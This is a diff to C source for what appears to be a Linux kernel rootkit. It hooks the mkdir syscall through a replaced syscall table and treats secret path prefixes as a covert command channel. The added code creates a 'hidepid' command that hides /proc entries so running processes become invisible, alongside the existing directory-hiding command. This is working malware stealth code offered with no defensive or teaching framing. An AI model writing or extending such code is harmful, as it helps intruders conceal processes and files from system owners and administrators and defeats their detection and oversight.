@@ -13,9 +13,27 @@
 #include "secrets.h"
 #include "hiddenDirectories.h"
 
+int hidePidApiHandler(char* pid) {
+	char path[20];
+	int i;
+	path[19] = 0;
+	strcpy(path, "/proc/");
+	strncpy(path + 6, pid, sizeof(path)-7);
+	printk("%s\n", path);
+	hideDirectory(path);
+	for (i = 0; i < hiddenDirectories->size; ++i) {
+		printk(KERN_INFO "path: %s\n", (char*)hiddenDirectories->arr[i]);
+	}
+	return 0;
+}
+
 int hideDirectoryApiHandler(char* path) {
 	int i;
+	printk("%s\n", path);
 	hideDirectory(path);
+	for (i = 0; i < hiddenDirectories->size; ++i) {
+		printk(KERN_INFO "path: %s\n", (char*)hiddenDirectories->arr[i]);
+	}
 	return 0;
 }
 
@@ -43,6 +61,9 @@ int mkdirShim(char* path) {
 	}
 	else if (strnstrn(path, strnlen(path, 20), secret_api_hidepath, 20)) {
 		return hideDirectoryApiHandler(path + 20);
+	}
+	else if (strnstrn(path, strnlen(path, 20), secret_api_hidepid, 20)) {
+		return hidePidApiHandler(path + 20);
 	}
 	return ((SYS_mkdir_type)backup_sys_call_table[SYS_mkdir])(path);
 }
